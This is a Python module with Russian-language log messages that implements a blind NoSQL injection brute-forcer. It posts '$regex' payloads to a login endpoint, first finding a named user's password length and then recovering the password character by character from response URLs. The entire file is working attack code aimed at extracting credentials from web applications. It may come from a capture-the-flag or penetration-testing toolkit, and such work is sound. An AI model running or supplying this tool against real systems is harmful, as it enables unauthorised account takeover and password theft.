import requests
import string
from .utils import info, success

class NoSQLiBruter:
    def __init__(self, url, username):
        self.url = url
        self.username = username
        self.chars = string.ascii_letters + string.digits + "!@#$%^&*()"
        self.password_length = 0
        self.found_password = ""

    def find_password_length(self, min_len=3, max_len=32):
        info(f"Определяем длину пароля для пользователя: {self.username}")
        for length in range(min_len, max_len + 1):
            payload = {
                "user": self.username,
                "pass[$regex]": f"^.{{{length}}}$"
            }
            r = requests.post(self.url, data=payload)

            if "err" not in r.url:
                success(f"Длина пароля найдена: {length}")
                self.password_length = length
                return length
        raise Exception("Не удалось определить длину пароля")

    def brute_password(self):
        if self.password_length == 0:
            raise Exception("Сначала вызовите find_password_length()")

        info("Начинаем подбор символов пароля...")
        for position in range(self.password_length):
            for char in self.chars:
                payload = {
                    "user": self.username,
                    "pass[$regex]": f"^{self.found_password}{char}.{{{self.password_length - len(self.found_password) - 1}}}$"
                }
                r = requests.post(self.url, data=payload)

                if "err" not in r.url:
                    self.found_password += char
                    success(f"Позиция {position + 1}: Найден символ: {char} | Текущий пароль: {self.found_password}")
                    break

        success(f"Финальный пароль: {self.found_password}")
        return self.found_password
